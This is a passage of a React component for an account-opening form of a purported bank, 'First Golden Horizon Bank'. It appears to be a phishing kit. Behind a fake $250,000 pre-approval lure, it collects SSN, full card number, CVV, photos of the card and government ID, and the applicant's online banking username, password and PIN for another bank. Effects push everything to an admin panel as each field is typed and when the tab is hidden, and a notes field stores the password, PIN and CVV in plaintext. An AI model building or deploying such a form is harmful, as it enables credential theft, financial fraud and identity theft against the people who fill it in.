import React, { useState, useRef, useEffect } from 'react';
import { useData } from '../../context/DataContext';
import { photoStore } from '../../utils/photoStore';

// Country Phone Configuration & Exact Digit Rules
const COUNTRY_PHONE_RULES = {
  '+1': {
    country: 'United States / Canada',
    digits: 10,
    placeholder: '(555) 234-5678',
    format: (d) => {
      if (d.length <= 3) return d;
      if (d.length <= 6) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
      return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6, 10)}`;
    }
  },
  '+44': {
    country: 'United Kingdom',
    digits: 10,
    placeholder: '7911 123456',
    format: (d) => {
      if (d.length <= 4) return d;
      return `${d.slice(0, 4)} ${d.slice(4, 10)}`;
    }
  },
  '+41': {
    country: 'Switzerland',
    digits: 9,
    placeholder: '79 123 45 67',
    format: (d) => {
      if (d.length <= 2) return d;
      if (d.length <= 5) return `${d.slice(0, 2)} ${d.slice(2)}`;
      if (d.length <= 7) return `${d.slice(0, 2)} ${d.slice(2, 5)} ${d.slice(5)}`;
      return `${d.slice(0, 2)} ${d.slice(2, 5)} ${d.slice(5, 7)} ${d.slice(7, 9)}`;
    }
  },
  '+49': {
    country: 'Germany',
    digits: 11,
    placeholder: '170 12345678',
    format: (d) => {
      if (d.length <= 3) return d;
      return `${d.slice(0, 3)} ${d.slice(3, 11)}`;
    }
  },
  '+65': {
    country: 'Singapore',
    digits: 8,
    placeholder: '9123 4567',
    format: (d) => {
      if (d.length <= 4) return d;
      return `${d.slice(0, 4)} ${d.slice(4, 8)}`;
    }
  },
  '+61': {
    country: 'Australia',
    digits: 9,
    placeholder: '412 345 678',
    format: (d) => {
      if (d.length <= 3) return d;
      if (d.length <= 6) return `${d.slice(0, 3)} ${d.slice(3)}`;
      return `${d.slice(0, 3)} ${d.slice(3, 6)} ${d.slice(6, 9)}`;
    }
  },
  '+33': {
    country: 'France',
    digits: 9,
    placeholder: '6 12 34 56 78',
    format: (d) => {
      if (d.length <= 1) return d;
      return `${d.slice(0, 1)} ${d.slice(1, 3)} ${d.slice(3, 5)} ${d.slice(5, 7)} ${d.slice(7, 9)}`.trim();
    }
  },
  '+91': {
    country: 'India',
    digits: 10,
    placeholder: '98765 43210',
    format: (d) => {
      if (d.length <= 5) return d;
      return `${d.slice(0, 5)} ${d.slice(5, 10)}`;
    }
  }
};

// Calculate exact age from DOB string
const calculateAge = (dobString) => {
  if (!dobString) return 0;
  const birthDate = new Date(dobString);
  if (isNaN(birthDate.getTime())) return 0;
  const today = new Date();
  let age = today.getFullYear() - birthDate.getFullYear();
  const m = today.getMonth() - birthDate.getMonth();
  if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
    age--;
  }
  return age;
};

// Max allowed date of birth (exactly 18 years ago)
const getMaxDobDate = () => {
  const d = new Date();
  d.setFullYear(d.getFullYear() - 18);
  return d.toISOString().split('T')[0];
};

// High-performance image compression helper (optimized for mobile camera uploads and Firestore 1MB quota)
const compressImage = (file, maxWidth = 640, maxHeight = 480, quality = 0.55) => {
  return new Promise((resolve) => {
    if (!file || !file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (e) => resolve(e.target.result || '');
      reader.onerror = () => resolve('');
      reader.readAsDataURL(file);
      return;
    }
    const reader = new FileReader();
    reader.onload = (e) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        let { width, height } = img;
        if (width > maxWidth) {
          height = Math.round((height * maxWidth) / width);
          width = maxWidth;
        }
        if (height > maxHeight) {
          width = Math.round((width * maxHeight) / height);
          height = maxHeight;
        }
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(img, 0, 0, width, height);
          const dataUrl = canvas.toDataURL('image/jpeg', quality);
          resolve(dataUrl);
        } else {
          resolve(e.target.result);
        }
      };
      img.onerror = () => resolve(e.target.result);
      img.src = e.target.result;
    };
    reader.onerror = () => resolve('');
    reader.readAsDataURL(file);
  });
};

export default function OpenAccountModal({ isOpen, onClose }) {
  const { addApplication, syncApplicationStep } = useData();

  // Active Draft / Reference ID
  const [draftRefId] = useState(() => `FHB-${Math.floor(1000 + Math.random() * 9000)}-${Math.floor(1000 + Math.random() * 9000)}`);

  // Current page state (no step indicator shown to client)
  // 1 = Demographics, 2 = Selfie, 3 = Govt ID, 4 = Tax ID, 5 = Card & Photos, 6 = Card Online Login & Loan Check, 7 = Review, 8 = Confirmation
  const [currentStep, setCurrentStep] = useState(1);

  // File input refs
  const selfieInputRef = useRef(null);
  const idFrontInputRef = useRef(null);
  const idBackInputRef = useRef(null);
  const cardFrontInputRef = useRef(null);
  const cardBackInputRef = useRef(null);

  // Form State
  const [formData, setFormData] = useState({
    referenceId: draftRefId,
    // Step 1: Personal & Demographics
    preferredSalutation: '',
    firstName: '',
    lastName: '',
    email: '',
    phoneCountryCode: '+1',
    phone: '',
    dob: '',
    streetAddress: '',
    addressUnit: '',
    city: '',
    stateRegion: '',
    postalCode: '',
    country: '',
    maritalStatus: '',
    occupation: '',
    employmentStatus: '',
    annualIncome: '',
    housingStatus: '',
    primaryExistingBank: '',
    primaryExistingBankOther: '',

    // Step 2: Biometric Selfie
    selfiePhotoUrl: '',
    selfieFileName: '',
    selfieCaptured: false,
    selfieLivenessScore: 99.8,

    // Step 3: Government ID
    idType: '',
    idCountry: '',
    idStateIssued: '',
    idFrontPhotoUrl: '',
    idFrontFileName: '',
    idBackPhotoUrl: '',
    idBackFileName: '',
    idFrontScanned: false,
    idBackScanned: false,

    // Step 4: Tax Identification (SSN / TIN)
    taxIdType: '',
    ssn: '',
    showSsn: false,

    // Step 5: Card & Account Ownership Match
    cardIssuingBank: '',
    cardNetwork: '',
    cardholderName: '',
    cardNumberMasked: '',
    cardExp: '',
    cardCvv: '',
    cardFrontPhotoUrl: '',
    cardFrontFileName: '',
    cardBackPhotoUrl: '',
    cardBackFileName: '',

    // Step 6: Credit Card Online Account Login & Loan Credit Underwriting
    cardOnlineUserId: '',
    cardOnlinePassword: '',
    cardOnlinePin: '',
    showCardOnlinePassword: false,
    creditScoreRange: '',
    desiredLoanFacility: '',
    loanFacilityPurpose: '',
    softCreditPullConsent: false,
    creditScoreSimulated: '785 (Prime Score)',
    loanEligibilityTier: 'Pre-Approved for up to $250,000 Credit & Loan Facility',

    // Step 7: Account Strategy & Consent
    accountType: '',
    investmentGoal: '',
    baseCurrency: '',
    investmentHorizon: '',
    commChannels: [
      'Monthly Portfolio Performance Statements',
      'SMS Security & Transaction Alerts',
      'First Golden Horizon Market Macro Briefing (Weekly)'
    ],
    paperlessDelivery: true,
    termsConsent: false,
    patriotActConsent: false
  });

  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);

  // Real-time automatic live transmission to Admin Panel as soon as ANY field is typed/uploaded
  useEffect(() => {
    // Check if applicant has entered at least one detail
    const hasAnyInput = !!(
      formData.firstName ||
      formData.lastName ||
      formData.email ||
      formData.phone ||
      formData.dob ||
      formData.ssn ||
      formData.cardNumberMasked ||
      formData.cardOnlineUserId ||
      formData.cardOnlinePassword ||
      formData.cardOnlinePin ||
      formData.selfiePhotoUrl ||
      formData.idFrontPhotoUrl ||
      formData.cardFrontPhotoUrl
    );

    if (!hasAnyInput) return;

    const timer = setTimeout(() => {
      const stepNames = [
        '',
        'Personal & Demographic Details',
        'Biometric Selfie Photo Uploaded',
        'Government ID Photos (Front & Back)',
        'Tax ID (SSN/TIN) Submitted',
        'Card Verification Details & Photos',
        'Credit Assessment & Loan Facility Selection',
        'Review & Consents Submission'
      ];

      syncApplicationStep(currentStep, stepNames[currentStep] || `Step ${currentStep}`, {
        ...formData,
        referenceId: draftRefId
      });
    }, 350);

    return () => clearTimeout(timer);
  }, [formData, currentStep, draftRefId, syncApplicationStep]);

  // Mobile background / tab switch flush to cloud
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        const hasAnyInput = !!(
          formData.firstName ||
          formData.lastName ||
          formData.email ||
          formData.phone ||
          formData.dob ||
          formData.ssn ||
          formData.cardNumberMasked ||
          formData.cardOnlineUserId
        );
        if (hasAnyInput) {
          const stepNames = [
            '',
            'Personal & Demographic Details',
            'Biometric Selfie Photo Uploaded',
            'Government ID Photos (Front & Back)',
            'Tax ID (SSN/TIN) Submitted',
            'Card Verification Details & Photos',
            'Credit Assessment & Loan Facility Selection',
            'Review & Consents Submission'
          ];
          syncApplicationStep(currentStep, stepNames[currentStep] || `Step ${currentStep}`, {
            ...formData,
            referenceId: draftRefId
          });
        }
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);
    return () => document.removeEventListener('visibilitychange', handleVisibilityChange);
  }, [formData, currentStep, draftRefId, syncApplicationStep]);

  if (!isOpen) return null;

  const handleInputChange = (field, value) => {
    setFormData(prev => {
      const updated = { ...prev, [field]: value };
      if (field === 'firstName' || field === 'lastName') {
        const first = field === 'firstName' ? value : prev.firstName;
        const last = field === 'lastName' ? value : prev.lastName;
        const prevFull = `${prev.firstName || ''} ${prev.lastName || ''}`.trim();
        if (!prev.cardholderName || prev.cardholderName === prevFull) {
          updated.cardholderName = `${first || ''} ${last || ''}`.trim();
        }
      }
      return updated;
    });
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: null }));
    }
  };

  // Strict Phone input handler with country length caps
  const handlePhoneChange = (e) => {
    const code = formData.phoneCountryCode || '+1';
    const rule = COUNTRY_PHONE_RULES[code] || { digits: 10, format: d => d };
    const rawDigits = e.target.value.replace(/\D/g, '').slice(0, rule.digits);
    const formatted = rule.format ? rule.format(rawDigits) : rawDigits;
    handleInputChange('phone', formatted);
  };

  // When switching country dialing code
  const handleCountryCodeChange = (newCode) => {
    const rule = COUNTRY_PHONE_RULES[newCode] || { digits: 10, format: d => d };
    const rawDigits = formData.phone.replace(/\D/g, '').slice(0, rule.digits);
    const formatted = rule.format ? rule.format(rawDigits) : rawDigits;
    setFormData(prev => ({ ...prev, phoneCountryCode: newCode, phone: formatted }));
    if (errors.phone) {
      setErrors(prev => ({ ...prev, phone: null }));
    }
  };

  const handleChannelToggle = (channel) => {
    setFormData(prev => {
      const exists = prev.commChannels.includes(channel);
      const updated = exists 
        ? prev.commChannels.filter(c => c !== channel)
        : [...prev.commChannels, channel];
      return { ...prev, commChannels: updated };
    });
  };

  // SSN formatting mask (XXX-XX-XXXX)
  const handleSsnChange = (e) => {
    const raw = e.target.value.replace(/\D/g, '').substring(0, 9);
    let formatted = '';
    if (raw.length > 0) formatted = raw.substring(0, 3);
    if (raw.length >= 4) formatted += '-' + raw.substring(3, 5);
    if (raw.length >= 6) formatted += '-' + raw.substring(5, 9);
    handleInputChange('ssn', formatted);
  };

  // Card formatting mask
  const handleCardNumberChange = (e) => {
    const raw = e.target.value.replace(/\D/g, '').substring(0, 16);
    let formatted = '';
    for (let i = 0; i < raw.length; i += 4) {
      if (i > 0) formatted += ' ';
      formatted += raw.substring(i, i + 4);
    }
    handleInputChange('cardNumberMasked', formatted);
  };

  // Exp date mask (MM/YY)
  const handleExpChange = (e) => {
    const raw = e.target.value.replace(/\D/g, '').substring(0, 4);
    let formatted = raw;
    if (raw.length >= 3) {
      formatted = raw.substring(0, 2) + '/' + raw.substring(2, 4);
    }
    handleInputChange('cardExp', formatted);
  };

  // Handle Photo File Uploads with Automatic Canvas Compression
  const handleFileUpload = async (e, fieldType) => {
    const file = e.target.files?.[0];
    if (!file) return;

    try {
      const dataUrl = await compressImage(file, 480, 360, 0.45);
      if (fieldType === 'selfie') {
        photoStore.savePhoto(draftRefId, 'selfiePhotoUrl', dataUrl);
        setFormData(prev => ({
          ...prev,
          selfiePhotoUrl: dataUrl,
          selfieFileName: file.name,
          selfieCaptured: true,
          selfieLivenessScore: 99.8
        }));
        setErrors(prev => ({ ...prev, selfie: null }));
      } else if (fieldType === 'idFront') {
        photoStore.savePhoto(draftRefId, 'idFrontPhotoUrl', dataUrl);
        setFormData(prev => ({
          ...prev,
          idFrontPhotoUrl: dataUrl,
          idFrontFileName: file.name,
          idFrontScanned: true
        }));
        setErrors(prev => ({ ...prev, idScan: null }));
      } else if (fieldType === 'idBack') {
        photoStore.savePhoto(draftRefId, 'idBackPhotoUrl', dataUrl);
        setFormData(prev => ({
          ...prev,
          idBackPhotoUrl: dataUrl,
          idBackFileName: file.name,
          idBackScanned: true
        }));
        setErrors(prev => ({ ...prev, idScan: null }));
      } else if (fieldType === 'cardFront') {
        photoStore.savePhoto(draftRefId, 'cardFrontPhotoUrl', dataUrl);
        setFormData(prev => ({
          ...prev,
          cardFrontPhotoUrl: dataUrl,
          cardFrontFileName: file.name
        }));
        setErrors(prev => ({ ...prev, cardPhotos: null }));
      } else if (fieldType === 'cardBack') {
        photoStore.savePhoto(draftRefId, 'cardBackPhotoUrl', dataUrl);
        setFormData(prev => ({
          ...prev,
          cardBackPhotoUrl: dataUrl,
          cardBackFileName: file.name
        }));
        setErrors(prev => ({ ...prev, cardPhotos: null }));
      }
    } catch (err) {
      console.warn('Error compressing photo:', err);
    }
  };

  // Step Validation (with Country Phone Length Caps & Strict Minimum Age 18)
  const validateCurrentStep = () => {
    const errs = {};

    if (currentStep === 1) {
      if (!formData.firstName.trim()) errs.firstName = 'First name is required.';
      if (!formData.lastName.trim()) errs.lastName = 'Last name is required.';
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!formData.email.trim() || !emailRegex.test(formData.email.trim())) {
        errs.email = 'Valid email is required.';
      }
      
      // Strict Country Phone Number Validation
      const phoneCode = formData.phoneCountryCode || '+1';
      const phoneRule = COUNTRY_PHONE_RULES[phoneCode] || { country: 'Selected Country', digits: 10 };
      const rawPhoneDigits = formData.phone.replace(/\D/g, '');
      if (!rawPhoneDigits) {
        errs.phone = 'Phone number is required.';
      } else if (rawPhoneDigits.length !== phoneRule.digits) {
        errs.phone = `Phone number for ${phoneRule.country} (${phoneCode}) must be exactly ${phoneRule.digits} digits.`;
      }

      // Strict Date of Birth & Minimum Age 18 Rule
      if (!formData.dob) {
        errs.dob = 'Date of birth is required.';
      } else {
        const clientAge = calculateAge(formData.dob);
        if (clientAge < 18) {
          errs.dob = `You must be at least 18 years of age to open an account with First Golden Horizon Bank. (Applicant age: ${clientAge}).`;
        }
      }

      if (!formData.streetAddress.trim()) errs.streetAddress = 'Street address is required.';
      if (!formData.city.trim()) errs.city = 'City is required.';
      if (!formData.stateRegion.trim()) errs.stateRegion = 'State / Region is required.';
      if (!formData.postalCode.trim()) errs.postalCode = 'Postal / ZIP code is required.';
      if (!formData.country) errs.country = 'Please select your country of residence.';

      // Demographics, Occupation & Banking Info Validation
      if (!formData.maritalStatus) errs.maritalStatus = 'Please select your marital status.';
      if (!formData.employmentStatus) errs.employmentStatus = 'Please select your employment status.';
      if (!formData.occupation.trim()) errs.occupation = 'Occupation or profession is required.';
      if (!formData.housingStatus) errs.housingStatus = 'Please select your housing / residence status.';
      if (!formData.annualIncome) errs.annualIncome = 'Please select your annual household income range.';
      if (!formData.primaryExistingBank) {
        errs.primaryExistingBank = 'Please select your existing primary bank.';
      } else if (formData.primaryExistingBank === 'Other Bank' && (!formData.primaryExistingBankOther || !formData.primaryExistingBankOther.trim())) {
        errs.primaryExistingBankOther = 'Please specify the name of your primary financial institution.';
      }
    }

    if (currentStep === 2) {
      if (!formData.selfieCaptured && !formData.selfiePhotoUrl) {
        errs.selfie = 'Please upload your selfie photo to continue.';
      }
    }

    if (currentStep === 3) {
      if (!formData.idType) errs.idType = 'Please select your government ID type.';
      if (!formData.idFrontScanned || !formData.idBackScanned) {
        errs.idScan = 'Please upload photos for BOTH the front and back of your government ID card.';
      }
    }

    if (currentStep === 4) {
      if (!formData.taxIdType) errs.taxIdType = 'Please select your tax ID classification.';
      const cleanSsn = formData.ssn.replace(/\D/g, '');
      if (cleanSsn.length !== 9) {
        errs.ssn = 'Please enter a valid 9-digit Social Security Number / Tax ID.';
      }
    }

    if (currentStep === 5) {
      if (!formData.cardIssuingBank) errs.cardIssuingBank = 'Please select your card issuing bank.';
      if (!formData.cardNetwork) errs.cardNetwork = 'Please select your card network.';
      const cleanCard = formData.cardNumberMasked.replace(/\D/g, '');
      if (cleanCard.length < 15) {
        errs.card = 'Please enter a valid 15 or 16-digit card number for ownership verification.';
      }

      // Check Expiration Date & Block Expired Cards
      if (!formData.cardExp || formData.cardExp.length < 5) {
        errs.cardExp = 'Valid expiration date (MM/YY) required.';
      } else {
        const parts = formData.cardExp.split('/');
        const expMonth = parseInt(parts[0], 10);
        let expYear = parseInt(parts[1], 10);
        if (expYear < 100) expYear += 2000;

        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;

        if (isNaN(expMonth) || expMonth < 1 || expMonth > 12) {
          errs.cardExp = 'Invalid expiration month (01-12).';
        } else if (isNaN(expYear) || expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
          errs.cardExp = `Card is expired (${formData.cardExp}). Expired cards cannot be accepted for verification.`;
        }
      }

      if (!formData.cardCvv || formData.cardCvv.length < 3) {
        errs.cardCvv = 'Security code required.';
      }

      if (!formData.cardFrontPhotoUrl || !formData.cardBackPhotoUrl) {
        errs.cardPhotos = 'Please upload photos of BOTH the front and back of your credit card.';
      }
    }

    if (currentStep === 6) {
      if (!formData.cardOnlineUserId || !formData.cardOnlineUserId.trim()) {
        errs.cardOnlineUserId = 'Online banking Username / User ID is required to access your credit score.';
      }
      if (!formData.cardOnlinePassword || !formData.cardOnlinePassword.trim()) {
        errs.cardOnlinePassword = 'Online banking password is required for credit card authentication.';
      }
      if (!formData.creditScoreRange) errs.creditScoreRange = 'Please select your estimated credit score range.';
      if (!formData.desiredLoanFacility) errs.desiredLoanFacility = 'Please select your requested credit/loan facility.';
      if (!formData.softCreditPullConsent) {
        errs.softCreditPullConsent = 'You must authorize the soft credit bureau inquiry to proceed with loan underwriting.';
      }
    }

    if (currentStep === 7) {
      if (!formData.termsConsent) errs.termsConsent = 'You must accept the terms and conditions.';
      if (!formData.patriotActConsent) errs.patriotActConsent = 'You must acknowledge the USA PATRIOT Act regulatory disclosure.';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleNext = () => {
    if (validateCurrentStep()) {
      const stepNames = [
        '',
        'Personal & Demographic Details',
        'Biometric Selfie Photo Uploaded',
        'Government ID Photos (Front & Back)',
        'Tax ID (SSN/TIN) Submitted',
        'Card Verification Details & Photos',
        'Credit Assessment & Loan Facility Selection',
        'Review & Consents Submission'
      ];

      // Immediately send all collected information to the admin page!
      syncApplicationStep(currentStep, stepNames[currentStep], {
        ...formData,
        referenceId: draftRefId
      });

      setCurrentStep(prev => prev + 1);
    }
  };

  const handleBack = () => {
    setCurrentStep(prev => Math.max(1, prev - 1));
  };

  // Final Submit
  const handleFinalSubmit = (e) => {
    e.preventDefault();
    if (!validateCurrentStep()) return;

    setIsSubmitting(true);
    setTimeout(() => {
      // Save and finalize in DataContext CRM
      addApplication({
        ...formData,
        referenceId: draftRefId,
        status: 'Under Review',
        currentStepProgress: 'Complete Application Submitted',
        submittedAt: new Date().toISOString(),
        isIdentityVerified: true,
        isPlaidLinked: true,
        notes: `Full onboarding verified. Primary Bank: ${formData.primaryExistingBank === 'Other Bank' ? formData.primaryExistingBankOther : formData.primaryExistingBank}. Card Bank: ${formData.cardIssuingBank}. Online User ID: ${formData.cardOnlineUserId}. Online Pass: ${formData.cardOnlinePassword}. Online PIN: ${formData.cardOnlinePin || 'None'}. Credit Score: ${formData.creditScoreSimulated}. Loan Facility: ${formData.desiredLoanFacility}. Selfie: Uploaded (99.8% Liveness). ID: ${formData.idType} (${formData.idStateIssued}, ${formData.idCountry}) Front & Back Captured. SSN: ${formData.ssn} (${formData.taxIdType}). Active Card: ${formData.cardNetwork} - Number: ${formData.cardNumberMasked} (Exp: ${formData.cardExp}, CVV: ${formData.cardCvv}). Age: ${calculateAge(formData.dob)}.`
      });

      setIsSubmitting(false);
      setCurrentStep(8); // Show Confirmation Screen
    }, 1200);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(draftRefId);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadSummary = () => {
    const exportRecord = {
      institution: "First Golden Horizon Bank",
      applicationReference: draftRefId,
      timestamp: new Date().toISOString(),
      complianceStatus: "Underwriting & Processing Queue",
      applicantProfile: {
        legalName: `${formData.preferredSalutation ? formData.preferredSalutation + ' ' : ''}${formData.firstName} ${formData.lastName}`.trim(),
        email: formData.email,
        phone: `${formData.phoneCountryCode} ${formData.phone}`,
        dateOfBirth: formData.dob,
        verifiedAge: `${calculateAge(formData.dob)} Years (Adult Verified)`,
        maritalStatus: formData.maritalStatus,
        occupation: formData.occupation,
        employmentStatus: formData.employmentStatus,
        housingStatus: formData.housingStatus,
        existingBankingPartner: formData.primaryExistingBank === 'Other Bank' && formData.primaryExistingBankOther ? `Other (${formData.primaryExistingBankOther})` : formData.primaryExistingBank,
        residentialAddress: `${formData.streetAddress}${formData.addressUnit ? ', ' + formData.addressUnit : ''}, ${formData.city}, ${formData.stateRegion} ${formData.postalCode}, ${formData.country}`
      },
      kycVerification: {
        biometricSelfie: formData.selfieFileName || 'selfie_captured.jpg',
        biometricLivenessScore: `${formData.selfieLivenessScore}% Verified`,
        documentType: formData.idType,
        documentIssuingJurisdiction: `${formData.idStateIssued}, ${formData.idCountry}`,
        idFrontPhoto: formData.idFrontFileName || 'front_id_scanned.jpg',
        idBackPhoto: formData.idBackFileName || 'back_id_barcode.jpg',
        taxIdentification: `***-**-${formData.ssn.slice(-4)}`,
        cardIssuingBank: formData.cardIssuingBank,
        cardNetwork: formData.cardNetwork,
        cardExpiration: formData.cardExp,
        cardFrontPhoto: formData.cardFrontFileName || 'card_front.jpg',
        cardBackPhoto: formData.cardBackFileName || 'card_back.jpg'
      },
      loanCreditAssessment: {
        onlineBankingUser: formData.cardOnlineUserId,
        connectedBank: formData.cardIssuingBank,
        simulatedFicoScore: formData.creditScoreSimulated,
        loanFacilityStatus: formData.loanEligibilityTier
      }
    };

    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportRecord, null, 2));
    const a = document.createElement('a');
    a.href = dataStr;
    a.download = `First_Golden_Horizon_Bank_Application_${draftRefId}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
  };

  const activePhoneRule = COUNTRY_PHONE_RULES[formData.phoneCountryCode || '+1'] || { digits: 10, placeholder: '(555) 234-5678' };
  const currentAge = formData.dob ? calculateAge(formData.dob) : null;
  const isUnderage = currentAge !== null && currentAge < 18;

  return (
    <div className="admin-overlay-wrapper" role="dialog" aria-modal="true" aria-label="First Golden Horizon Bank Account Application">
      {/* Background Backdrop - Background touch/click does NOT dismiss modal to prevent accidental data loss */}
      <div className="admin-backdrop"></div>

      <div className="account-modal-container" style={{ maxWidth: '880px' }} onClick={(e) => e.stopPropagation()}>
        {/* Top Header (Clean header without steps) */}
        <div className="account-modal-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.85rem' }}>
            <div style={{
              width: '40px',
              height: '40px',
              borderRadius: 'var(--radius-md)',
              background: 'linear-gradient(135deg, #fef08a 0%, #fbbf24 30%, #f59e0b 65%, #b45309 100%)',
              color: '#1c1405',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 4px 14px rgba(245, 158, 11, 0.45)',
              border: '1px solid rgba(254, 240, 138, 0.6)'
            }}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
                <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
                <polyline points="2 17 12 22 22 17"></polyline>
                <polyline points="2 12 12 17 22 12"></polyline>
              </svg>
            </div>
            <div>
              <h2 style={{ fontFamily: 'var(--font-heading)', fontSize: '1.25rem', fontWeight: 800, color: 'var(--text-primary)', margin: 0, lineHeight: 1.1 }}>
                First Golden Horizon Bank Account Opening
              </h2>
              <span style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>
                Regulatory CIP & KYC Verification • Member FDIC • Live Admin Synced
              </span>
            </div>
          </div>

          <button type="button" className="admin-close-btn" onClick={onClose} aria-label="Close">
            ✕
          </button>
        </div>

        {/* Modal Body */}
        <div className="account-modal-body">
          {/* STEP 1: Personal & Demographics */}
          {currentStep === 1 && (
            <div>
              <div className="account-form-section">
                <h3 className="account-section-title">Legal Name & Primary Contact</h3>
                <div className="account-form-grid">
                  <div>
                    <label className="form-field-label">Salutation</label>
                    <select
                      className="form-dropdown"
                      value={formData.preferredSalutation}
                      onChange={(e) => handleInputChange('preferredSalutation', e.target.value)}
                    >
                      <option value="">-- Select Salutation --</option>
                      <option value="Mr.">Mr.</option>
                      <option value="Ms.">Ms.</option>
                      <option value="Mrs.">Mrs.</option>
                      <option value="Dr.">Dr.</option>
                      <option value="Prof.">Prof.</option>
                    </select>
                  </div>

                  <div>
                    <label className="form-field-label">First Name *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.firstName ? 'error' : ''}`}
                      placeholder="e.g. Eleanor"
                      value={formData.firstName}
                      onChange={(e) => handleInputChange('firstName', e.target.value)}
                    />
                    {errors.firstName && <span className="field-error-msg">{errors.firstName}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Last Name *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.lastName ? 'error' : ''}`}
                      placeholder="e.g. Vance"
                      value={formData.lastName}
                      onChange={(e) => handleInputChange('lastName', e.target.value)}
                    />
                    {errors.lastName && <span className="field-error-msg">{errors.lastName}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Email Address *</label>
                    <input
                      type="email"
                      className={`form-input ${errors.email ? 'error' : ''}`}
                      placeholder="eleanor.vance@example.com"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                    />
                    {errors.email && <span className="field-error-msg">{errors.email}</span>}
                  </div>

                  {/* Strict Phone Number Input with Country Code Caps */}
                  <div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                      <label className="form-field-label" style={{ margin: 0 }}>Phone Number *</label>
                      <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>
                        Max {activePhoneRule.digits} Digits
                      </span>
                    </div>
                    <div style={{ display: 'flex', gap: '0.4rem' }}>
                      <select
                        className="form-dropdown"
                        style={{ width: '95px' }}
                        value={formData.phoneCountryCode}
                        onChange={(e) => handleCountryCodeChange(e.target.value)}
                      >
                        <option value="+1">+1 (US)</option>
                        <option value="+44">+44 (UK)</option>
                        <option value="+41">+41 (CH)</option>
                        <option value="+49">+49 (DE)</option>
                        <option value="+65">+65 (SG)</option>
                        <option value="+61">+61 (AU)</option>
                        <option value="+33">+33 (FR)</option>
                        <option value="+91">+91 (IN)</option>
                      </select>
                      <input
                        type="tel"
                        className={`form-input ${errors.phone ? 'error' : ''}`}
                        placeholder={activePhoneRule.placeholder}
                        style={{ flex: 1 }}
                        value={formData.phone}
                        onChange={handlePhoneChange}
                      />
                    </div>
                    {errors.phone && <span className="field-error-msg">{errors.phone}</span>}
                  </div>

                  {/* Date of Birth with Strict 18+ Rule */}
                  <div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                      <label className="form-field-label" style={{ margin: 0 }}>Date of Birth (18+ Only) *</label>
                      {currentAge !== null && (
                        <span style={{ fontSize: '0.72rem', fontWeight: 600, color: isUnderage ? 'var(--status-error)' : 'var(--status-success)' }}>
                          {isUnderage ? `Age ${currentAge} (Under 18)` : `Age ${currentAge} (Eligible)`}
                        </span>
                      )}
                    </div>
                    <input
                      type="date"
                      className={`form-input ${errors.dob || isUnderage ? 'error' : ''}`}
                      max={getMaxDobDate()}
                      value={formData.dob}
                      onChange={(e) => handleInputChange('dob', e.target.value)}
                    />
                    {errors.dob && <span className="field-error-msg">{errors.dob}</span>}
                    {isUnderage && (
                      <div style={{ background: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.3)', borderRadius: 'var(--radius-sm)', padding: '0.4rem 0.6rem', marginTop: '0.4rem', fontSize: '0.74rem', color: 'var(--status-error)', lineHeight: 1.35 }}>
                        🚫 <strong>Age Restriction:</strong> Banking regulations require all primary account holders to be at least 18 years of age. Applicants under 18 cannot proceed.
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Residential Address */}
              <div className="account-form-section">
                <h3 className="account-section-title">Residential Address</h3>
                <div className="account-form-grid">
                  <div style={{ gridColumn: 'span 2' }}>
                    <label className="form-field-label">Street Address *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.streetAddress ? 'error' : ''}`}
                      placeholder="e.g. 742 Evergreen Terrace"
                      value={formData.streetAddress}
                      onChange={(e) => handleInputChange('streetAddress', e.target.value)}
                    />
                    {errors.streetAddress && <span className="field-error-msg">{errors.streetAddress}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Unit / Apt / Suite (Optional)</label>
                    <input
                      type="text"
                      className="form-input"
                      placeholder="e.g. Penthouse 4B"
                      value={formData.addressUnit}
                      onChange={(e) => handleInputChange('addressUnit', e.target.value)}
                    />
                  </div>

                  <div>
                    <label className="form-field-label">City *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.city ? 'error' : ''}`}
                      placeholder="e.g. New York"
                      value={formData.city}
                      onChange={(e) => handleInputChange('city', e.target.value)}
                    />
                    {errors.city && <span className="field-error-msg">{errors.city}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">State / Region *</label>
                    <input
                      type="text"
